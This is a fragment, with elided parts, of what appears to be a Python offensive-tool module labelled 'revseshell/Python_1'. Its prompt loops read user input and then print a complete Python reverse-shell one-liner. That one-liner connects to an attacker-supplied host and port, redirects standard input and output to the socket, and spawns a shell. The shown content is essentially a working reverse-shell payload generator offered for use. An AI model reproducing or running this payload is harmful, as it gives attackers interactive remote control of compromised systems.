...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mrevseshell/Python_1\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevseshell/Python_1\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mexport RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
""")
